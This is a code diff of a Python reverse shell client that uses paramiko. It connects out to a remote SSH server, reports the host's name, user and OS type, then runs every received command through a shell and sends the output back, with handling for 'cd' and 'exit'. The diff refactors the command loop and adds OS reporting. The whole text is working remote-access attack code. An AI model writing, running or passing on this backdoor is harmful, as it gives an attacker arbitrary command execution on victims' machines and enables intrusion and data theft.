@@ -16,7 +16,7 @@ optional.add_argument("-u", dest="user", default="sshUser", help="User to authen
 optional.add_argument("-pwd", dest="password", default="sshPass", help="Password to authenticate (Default: sshPass)")
 
 if (len(sys.argv) == 1):
-    parser.print_help(sys.stderr)
+    parser.print_help(sys.stdout)
     sys.exit()
 
 args = parser.parse_args()
@@ -26,40 +26,42 @@ def SSH_comm():
     port = args.port #Server port
     username = args.user #Server username
     password = args.password #Server password
+
     try:
         SSH = paramiko.SSHClient()
         SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         SSH.connect(ip, port=port, username=username, password=password)
-        start_session = SSH.get_transport().open_session()
+        session = SSH.get_transport().open_session()
         host = socket.gethostname()
         user = getpass.getuser()
+        type = os.name
     except Exception as ex:
         print("[!] Unable to connect to server.")
         sys.exit()
 
-    if start_session.active:
-        start_session.send(f"{host},{user}")
-        print(start_session.recv(1024).decode())
+    if session.active:
+        session.sendall(f"{host},{user},{type}")
+        print(session.recv(1024).decode())
         while True:
-            incoming = start_session.recv(1024)
             try:
-                command = incoming.decode()
-                if command == "exit":
-                    sys.exit()
-                if command.split(" ")[0] == "cd":
-                    path = " ".join(command.split(" ")[1:])
-                    os.chdir(path)
-                    CWD = os.getcwd()
-                    start_session.send(f"True,{CWD}")
-                else:
-                    command_out = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
-                    if (len(command_out) == 0):
-                        start_session.send("[*] Command executed. No shell output.\n")
-                    else:
-                        start_session.send(command_out)
+                command = session.recv(1024).decode()
+                head = command.split(" ")[0]
+                match head:
+                    case "exit":
+                        sys.exit()
+                    case "cd":
+                        path = " ".join(command.split(" ")[1:])
+                        os.chdir(path)
+                        CWD = os.getcwd()
+                        session.sendall(f"Changed directory to {CWD}\n")
+                    case _:
+                        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
+                        if (len(output) == 0):
+                            session.sendall("[*] Command executed. No shell output.\n")
+                        else:
+                            session.sendall(output)
             except Exception as ex:
-                start_session.send("[!] " + str(ex) + "\n")
-                pass
+                session.sendall("[!] " + str(ex) + "\n")
     return
 
 if __name__ == "__main__":
